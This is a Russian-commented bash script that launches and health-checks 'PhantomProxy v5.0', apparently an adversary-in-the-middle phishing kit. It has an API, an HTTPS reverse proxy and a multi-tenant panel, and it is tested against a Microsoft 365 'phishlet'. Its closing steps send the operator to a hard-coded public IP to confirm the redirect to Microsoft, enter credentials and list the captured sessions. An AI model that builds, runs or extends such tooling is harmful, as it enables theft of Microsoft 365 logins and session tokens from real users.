#!/bin/bash
# Тестирование Microsoft 365 фишлета
# Запустить на сервере: bash test_o365.sh

echo "============================================================"
echo "ТЕСТИРОВАНИЕ MICROSOFT 365 ФИШЛЕТА"
echo "============================================================"
echo ""

cd ~/phantom-proxy

# 1. Остановка старых процессов
echo "[1/6] Очистка..."
pkill -f 'python.*\\.py' 2>/dev/null || true
sleep 2
echo "✅ Очищено"

# 2. Запуск API
echo ""
echo "[2/6] Запуск API..."
nohup python3 api.py > api.log 2>&1 &
sleep 3

if curl -s http://localhost:8080/health | grep -q '"status"'; then
    echo "✅ API запущен (порт 8080)"
else
    echo "❌ API не запустился"
    exit 1
fi

# 3. Запуск HTTPS Proxy
echo ""
echo "[3/6] Запуск HTTPS Proxy..."
nohup python3 https.py > https.log 2>&1 &
sleep 3

if curl -sk https://localhost:8443/ -w '%{http_code}' -o /dev/null | grep -q '302\|200'; then
    echo "✅ HTTPS Proxy запущен (порт 8443)"
else
    echo "❌ HTTPS Proxy не запустился"
fi

# 4. Запуск Panel
echo ""
echo "[4/6] Запуск Multi-Tenant Panel..."
cd panel
nohup python3 server.py > ../panel.log 2>&1 &
cd ..
sleep 3

if curl -s http://localhost:3000/ | grep -q 'PhantomProxy'; then
    echo "✅ Panel запущена (порт 3000)"
else
    echo "⚠️ Panel может не работать"
fi

# 5. Проверка всех сервисов
echo ""
echo "[5/6] Проверка сервисов..."
echo ""

SERVICES_OK=0
SERVICES_TOTAL=0

check_service() {
    local name=$1
    local port=$2
    local https=${3:-false}
    
    SERVICES_TOTAL=$((SERVICES_TOTAL + 1))
    
    if [ "$https" = "true" ]; then
        result=$(curl -sk --connect-timeout 2 https://localhost:$port/ 2>&1)
    else
        result=$(curl -s --connect-timeout 2 http://localhost:$port/health 2>&1)
    fi
    
    if [ -n "$result" ]; then
        echo "  ✅ $name (порт $port)"
        SERVICES_OK=$((SERVICES_OK + 1))
    else
        echo "  ❌ $name (порт $port)"
    fi
}

check_service "Main API" 8080
check_service "HTTPS Proxy" 8443 true
check_service "Multi-Tenant Panel" 3000

echo ""
echo "Сервисов работает: $SERVICES_OK из $SERVICES_TOTAL"

# 6. Тестирование функционала
echo ""
echo "[6/6] Тестирование функционала..."
echo ""

# Тест API
echo "  Тест API Health:"
API_RESULT=$(curl -s http://localhost:8080/health)
echo "    $API_RESULT"

if echo "$API_RESULT" | grep -q '"status":"ok"'; then
    echo "    ✅ API отвечает"
else
    echo "    ❌ API не отвечает"
fi

# Тест Stats
echo ""
echo "  Тест API Stats:"
STATS_RESULT=$(curl -s http://localhost:8080/api/v1/stats)
echo "    $STATS_RESULT"

if echo "$STATS_RESULT" | grep -q 'total_sessions\|phishlets'; then
    echo "    ✅ Stats работает"
else
    echo "    ⚠️ Stats может не работать"
fi

# Тест HTTPS Proxy
echo ""
echo "  Тест HTTPS Proxy:"
HTTPS_CODE=$(curl -sk https://localhost:8443/ -w '%{http_code}' -o /dev/null)
echo "    HTTP Code: $HTTPS_CODE"

if [ "$HTTPS_CODE" = "302" ] || [ "$HTTPS_CODE" = "200" ]; then
    echo "    ✅ HTTPS Proxy отвечает"
else
    echo "    ❌ HTTPS Proxy не отвечает"
fi

# Проверка логов
echo ""
echo "  Проверка логов:"
if [ -f "api.log" ]; then
    echo "    ✅ api.log существует"
    tail -3 api.log | sed 's/^/    /'
else
    echo "    ❌ api.log не найден"
fi

if [ -f "https.log" ]; then
    echo "    ✅ https.log существует"
else
    echo "    ❌ https.log не найден"
fi

if [ -f "panel.log" ]; then
    echo "    ✅ panel.log существует"
else
    echo "    ❌ panel.log не найден"
fi

# Итоги
echo ""
echo "============================================================"
echo "ИТОГИ ТЕСТИРОВАНИЯ"
echo "============================================================"
echo ""

if [ $SERVICES_OK -eq $SERVICES_TOTAL ]; then
    echo "🎉 ВСЕ СЕРВИСЫ РАБОТАЮТ!"
    echo ""
    echo "Доступные эндпоинты:"
    echo "  Main API:          http://212.233.93.147:8080"
    echo "  HTTPS Proxy:       https://212.233.93.147:8443"
    echo "  Multi-Tenant Panel: http://212.233.93.147:3000"
    echo ""
    echo "Для проверки Microsoft 365 фишлета:"
    echo "  1. Открой: https://212.233.93.147:8443"
    echo "  2. Должна открыться страница с редиректом на Microsoft"
    echo "  3. Введи тестовые данные"
    echo "  4. Проверь сессии: phantom> sessions"
else
    echo "⚠️ НЕКОТОРЫЕ СЕРВИСЫ НЕ РАБОТАЮТ"
    echo ""
    echo "Проверь логи:"
    echo "  tail -f api.log"
    echo "  tail -f https.log"
    echo "  tail -f panel.log"
fi

echo ""
echo "============================================================"

# Сохранение отчёта
cat > TEST_REPORT.txt << EOF
PHANTOMPROXY v5.0 - TEST REPORT
================================
Date: $(date)
Services: $SERVICES_OK/$SERVICES_TOTAL

Endpoints:
- API:  http://212.233.93.147:8080/health
- HTTPS: https://212.233.93.147:8443/
- Panel: http://212.233.93.147:3000/

API Response: $API_RESULT
Stats Response: $STATS_RESULT
HTTPS Code: $HTTPS_CODE

Processes:
$(ps aux | grep -E 'python.*\\.py' | grep -v grep)

Disk Usage:
$(df -h / | tail -1)
EOF

echo "Отчёт сохранён: TEST_REPORT.txt"
